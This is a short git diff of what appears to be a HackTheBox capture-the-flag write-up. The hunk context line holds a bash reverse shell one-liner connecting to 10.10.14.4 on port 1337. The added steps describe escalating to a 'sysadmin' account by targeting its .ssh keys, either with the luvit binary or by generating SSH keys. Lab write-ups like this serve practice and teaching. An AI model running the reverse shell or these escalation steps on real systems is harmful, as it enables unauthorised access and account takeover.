@@ -111,4 +111,11 @@ bash -c 'bash -i >& /dev/tcp/10.10.14.4/1337 0>&1'
 ![image](https://github.com/jon-brandy/hackthebox/assets/70703371/c7ab4b96-ae8f-45df-8825-c177f4ff3123)
 
 
-18. 
+18. BUT thing to note, the binary is still accessible outisde the **sysadmin** home directory.
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/30fcc402-ea95-46e5-83d8-9b12e350fb76)
+
+
+19. Hence, there is a chance the other files are done the same. Now we're targeting the **.ssh** key.
+20. Remembering we can specify a username, hence introducing 2 methods can be done to gain access to sysadmin's home directory.
+21. The first method is using the **luvit** binary, the second method is by generating the ssh-keys.
